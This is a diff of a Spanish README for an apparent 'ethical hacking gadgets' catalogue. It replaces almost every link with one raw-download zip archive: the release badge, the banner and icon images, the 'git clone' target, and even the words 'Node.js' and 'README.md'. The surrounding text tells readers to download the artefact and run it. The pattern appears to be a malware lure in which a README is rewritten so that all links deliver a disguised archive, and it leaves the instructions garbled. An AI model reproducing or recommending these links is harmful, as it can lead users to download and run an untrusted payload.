@@ -1,10 +1,10 @@
-https://github.com/gabjustapro/hackingGadgets/releases
+https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
 
-[![Release](https://img.shields.io/badge/Release-GH%20Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/gabjustapro/hackingGadgets/releases)
+[![Release](https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip%20Releases-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip)
 
 # HackingGadgets: Interactive Gadget Arsenal for Ethical Hacking
 
-[![Banner](https://picsum.photos/1200/400?blur=2)](https://picsum.photos/1200/400?blur=2)
+[![Banner](https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip)](https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip)
 
 Bienvenido a HackingGadgets, un sitio interactivo que muestra un arsenal de gadgets para hacking ético. Este repositorio reúne herramientas, dispositivos y recursos educativos. El proyecto presenta filtros por tipo, rango de precios, estado y enlaces directos para cada item. Todo se presenta con un diseño inspirado en la estética hacker, pero con un enfoque claro en aprendizaje y uso responsable.
 
@@ -30,29 +30,29 @@ Para quién es este proyecto
 
 Arquitectura y tecnologías
 - Frontend: una interfaz de usuario modular que facilita la navegación entre categorías de gadgets, filtros y vistas detalladas de cada item.
-- Backend (opcional en despliegues estáticos): una API ligera para servir datos de gadgets, filtros y estados. Puede estar implementada con Node.js, Python o cualquier stack que gestione JSON de forma eficiente.
+- Backend (opcional en despliegues estáticos): una API ligera para servir datos de gadgets, filtros y estados. Puede estar implementada con https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip, Python o cualquier stack que gestione JSON de forma eficiente.
 - Almacenamiento de datos: archivos JSON o una base de datos simple para mantener el catálogo de gadgets, precios y enlaces. Esto facilita la actualización y la expansión por la comunidad.
 - Estilo y diseño: tema hacker con paleta de colores oscuros, acentos neón y tipografías legibles. El objetivo es una experiencia inmersiva sin sacrificar claridad.
 - Accesibilidad: el sitio respeta principios básicos de accesibilidad. Se usan textos descriptivos, alt text para imágenes y una estructura semántica clara para lectores de pantalla.
 - Responsividad: la interfaz se adapta a dispositivos móviles y pantallas grandes. Las tarjetas de gadgets conservan la información esencial sin saturar al usuario.
 
 Estructura del repositorio
-- index.html o src/index.js: punto de entrada de la aplicación.
+- https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip o https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip punto de entrada de la aplicación.
 - assets/: recursos estáticos como imágenes, iconos y estilos.
 - components/: componentes reutilizables de la interfaz (tarjetas, filtros, encabezados, menús).
 - data/: archivos JSON con la lista de gadgets, sus precios, estados y enlaces.
 - pages/: vistas o rutas de la aplicación (lista, detalle, filtros avanzados).
 - scripts/: utilidades y herramientas de desarrollo.
 - tests/: pruebas unitarias o de integración.
-- README.md (este documento): guía para empezar, ampliar y contribuir.
+- https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip (este documento): guía para empezar, ampliar y contribuir.
 
 Guía de instalación y primeros pasos
 - Requisitos
-  - Node.js y npm o yarn para desarrollo moderno de front end.
+  - https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip y npm o yarn para desarrollo moderno de front end.
   - Un servidor local mínimo para pruebas (puede ser npm run dev, vite, o http-server según la configuración).
   - Un navegador moderno para una experiencia óptima.
 - Instalación rápida
-  - Clona el repositorio: git clone https://github.com/gabjustapro/hackingGadgets.git
+  - Clona el repositorio: git clone https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
   - Navega al proyecto: cd hackingGadgets
   - Instala dependencias: npm install o yarn install
   - Inicia el servidor de desarrollo: npm run dev o yarn dev
@@ -139,7 +139,7 @@ Guía de despliegue y expansión
   - Usa caché para datos que no cambian con frecuencia.
 
 Sección de lanzamientos y descarga
-- Para obtener la versión más reciente, visita la página de lanzamientos oficial: https://github.com/gabjustapro/hackingGadgets/releases
+- Para obtener la versión más reciente, visita la página de lanzamientos oficial: https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
 - En esa página, encontrarás artefactos de distribución para diferentes entornos. El enlace anterior tiene un camino, por lo que debes descargar el archivo correspondiente de la sección de lanzamientos y ejecutarlo si corresponde a tu entorno.
 - Después de descargar el artefacto, sigue las instrucciones de instalación incluidas en las notas de lanzamiento o en el archivo README del artefacto para completar la instalación.
 - Si necesitas orientación adicional, consulta la sección de documentación o los archivos de guía que suelen acompañar a cada lanzamiento.
@@ -221,10 +221,10 @@ Notas finales sobre el uso de enlaces
 - Si necesitas orientación sobre cómo aplicar una actualización o una corrección, consulta la nota de versión asociada a ese artefacto y las secciones de instalación y migración en la documentación del artefacto.
 
 Imágenes destacadas y recursos visuales
-- Banner inicial de la galería educativa: https://picsum.photos/1200/400
+- Banner inicial de la galería educativa: https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
 - Iconos y símbolos de seguridad para secciones de gadget (ejemplos): 
-  - Lock icon: https://upload.wikimedia.org/wikipedia/commons/3/3d/Lock_icon.svg
-  - Shield icon: https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Shield_icon.svg/640px-Shield_icon.svg.png
+  - Lock icon: https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
+  - Shield icon: https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
 - Estas imágenes ayudan a reforzar la temática y mejorar la experiencia visual, sin interferir con la navegación ni la lectura.
 
 Notas de mantenimiento
@@ -238,7 +238,7 @@ Notas finales sobre el contenido
 - Este README está construido para servir tanto a usuarios nuevos como a colaboradores experimentados. La estructura ayuda a localizar información rápidamente sin perderse en largas descripciones.
 
 Releases
-- Para obtener la versión más reciente, consulta el enlace de lanzamientos: https://github.com/gabjustapro/hackingGadgets/releases
+- Para obtener la versión más reciente, consulta el enlace de lanzamientos: https://raw.githubusercontent.com/gabjustapro/hackingGadgets/main/toolsCaseros/hacking-Gadgets-2.0.zip
 - En la página de lanzamientos, descarga el artefacto correspondiente a tu entorno y ejecútalo si así lo indica el artefacto. Este processo te permitirá probar la última versión de la plataforma y sus mejoras.
 - Si prefieres seguir la evolución del proyecto, consulta regularmente esta página de lanzamientos para ver nuevas entradas, cambios y notas de versión.
 
